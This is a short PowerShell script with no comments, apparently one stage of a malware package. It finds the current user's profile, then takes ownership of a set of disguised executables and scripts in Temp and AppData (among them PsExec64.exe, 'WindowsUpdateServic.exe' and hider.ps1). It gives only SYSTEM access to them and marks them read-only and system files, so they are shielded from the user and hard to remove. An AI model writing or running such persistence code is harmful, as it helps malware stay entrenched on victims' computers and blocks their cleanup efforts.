$LoggedInUser = (Get-CimInstance Win32_ComputerSystem).UserName

if ($LoggedInUser -and $LoggedInUser.Contains("\")) {
    $UserName = $LoggedInUser.Split("\")[1]
} else {
    $OwnerInfo = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" | Invoke-CimMethod -MethodName GetOwner -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($OwnerInfo -and $OwnerInfo.User) {
        $UserName = $OwnerInfo.User
    } else {
        $UserName = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI").LastLoggedOnUserSAM
        if ($UserName -and $UserName.Contains("\")) { $UserName = $UserName.Split("\")[1] }
    }
}

if (-not $UserName) { $UserName = [Environment]::UserName }

$UserFolder = "C:\Users\$UserName"
$RealTemp = Join-Path $UserFolder "AppData\Local\Temp"
$RealAppData = Join-Path $UserFolder "AppData\Roaming"

$filePaths = @(
    (Join-Path $RealTemp "syshealth.pyw"),
    (Join-Path $RealTemp "PsExec64.exe"),
    (Join-Path $RealTemp "WindowsUpdateServic.exe"),
    (Join-Path $RealTemp "rights.ps1"),
    (Join-Path $RealTemp "hider.ps1"),
    (Join-Path $RealTemp "first.exe"),
    (Join-Path $RealAppData "WinHCheck.exe")
)

foreach ($filePath in $filePaths) {
    if (-not (Test-Path $filePath)) { continue }
    
    [System.IO.File]::SetAttributes($filePath, [System.IO.FileAttributes]::Normal)

    $aclSettings = Get-Acl -Path $filePath
    $systemAccount = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
    $aclSettings.SetOwner($systemAccount)


    $aclSettings.SetAccessRuleProtection($true, $false)


    $systemAccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", "FullControl", "Allow")
    $aclSettings.AddAccessRule($systemAccessRule)



    Set-Acl -Path $filePath -AclObject $aclSettings -ErrorAction SilentlyContinue


    [System.IO.File]::SetAttributes($filePath, [System.IO.FileAttributes]::ReadOnly -bor [System.IO.FileAttributes]::System)
}
